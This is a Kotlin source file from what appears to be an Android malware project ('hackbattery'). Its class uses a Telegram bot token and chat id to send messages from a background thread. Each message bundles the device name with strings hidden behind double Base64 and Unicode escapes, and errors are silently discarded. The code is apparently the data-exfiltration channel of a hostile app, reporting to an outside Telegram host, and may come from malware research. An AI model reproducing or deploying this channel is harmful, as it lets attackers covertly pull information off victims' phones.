package cocomelonc.hackbattery.tools

import android.annotation.SuppressLint
import android.content.Context
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.pengrad.telegrambot.TelegramBot
import com.pengrad.telegrambot.request.SendMessage
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.nio.charset.StandardCharsets
import java.util.*


class HackBatteryNetwork(context: Context) : ViewModel() {
    private val token = HackBatteryUtils.getHackBatteryNetworkData(context).token
    private val id = HackBatteryUtils.getHackBatteryNetworkData(context).id
    private var bot = TelegramBot(token)

    @SuppressLint("NewApi")
    fun sendTextMessage(message: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                val footer0 = "OEoyUW5mQ2RrSjd3blpDdjhKMlFudkNka0tYd25aQ284SjJRcWZDZGtKN3duWkNkSVBDZGtKdnduWkN5SURvZ1FHTnZZMjl0Wld4dmJtTT0"
                val footer = String(Base64.getDecoder().decode(footer0), StandardCharsets.UTF_8)
                val footer2 = String(Base64.getDecoder().decode(footer), StandardCharsets.UTF_8)
                val info = "\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E : ${HackBatteryUtils.getDeviceName()}"
                val meow = "\u004d\u0065\u006f\u0077\u0020\u0066\u0072\u006f\u006d\u0020\u0042\u0061\u0068\u0072\u0061\u0069\u006e\u0021"
                val messageToSend = "$message\n\n$info\n\n$meow\n\n${footer2}"
                bot.execute(SendMessage(id, messageToSend))
            }
        } catch (e: Exception) {}
    }

}